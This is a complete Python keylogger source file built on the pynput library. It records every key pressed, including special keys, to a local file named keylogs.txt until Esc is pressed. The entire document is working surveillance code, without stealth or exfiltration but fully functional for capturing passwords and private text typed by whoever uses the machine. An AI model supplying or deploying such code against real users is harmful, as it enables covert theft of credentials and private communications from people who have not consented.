from pynput import keyboard
#
# The file where the keylogs will be saved
log_file = "keylogs.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # This is for special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f" {str(key)} ")
#main
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
